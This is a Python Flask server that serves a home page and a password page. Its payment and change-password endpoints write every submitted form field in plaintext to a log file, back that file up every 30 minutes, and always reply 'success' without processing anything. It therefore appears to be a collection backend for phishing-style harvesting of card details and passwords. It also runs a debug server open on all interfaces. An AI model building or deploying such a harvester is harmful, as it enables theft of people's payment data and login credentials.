from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import os
import json
import shutil
from apscheduler.schedulers.background import BackgroundScheduler

app = Flask(__name__)

DATA_FILE = "data/logs.jsonl"
BACKUP_DIR = "data/backups"

os.makedirs("data", exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)


# -------------------------
# GET ROUTES (HTML pages)
# -------------------------

@app.route("/")
def home():
    return send_from_directory("static", "index.html")

@app.route("/password")
def password_page():
    return send_from_directory("static", "password.html")


# -------------------------
# POST ROUTES (API)
# -------------------------

@app.route("/api/payment", methods=["POST"])
def payment_api():
    data = request.form.to_dict()

    save_log({
        "type": "payment",
        "data": data,
        "time": datetime.utcnow().isoformat()
    })

    return jsonify({"status": "success"})


@app.route("/api/changepassword", methods=["POST"])
def change_password_api():
    data = request.form.to_dict()

    save_log({
        "type": "change_password",
        "data": data,
        "time": datetime.utcnow().isoformat()
    })

    return jsonify({"status": "success"})


# -------------------------
# LOGGING FUNCTION
# -------------------------

def save_log(entry):
    with open(DATA_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")


# -------------------------
# BACKUP EVERY 30 MINUTES
# -------------------------

def backup_logs():
    if os.path.exists(DATA_FILE):
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        backup_path = f"{BACKUP_DIR}/logs_{timestamp}.jsonl"
        shutil.copy(DATA_FILE, backup_path)
        print(f"[BACKUP CREATED] {backup_path}")


scheduler = BackgroundScheduler()
scheduler.add_job(backup_logs, "interval", minutes=30)
scheduler.start()


# -------------------------
# RUN SERVER
# -------------------------

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)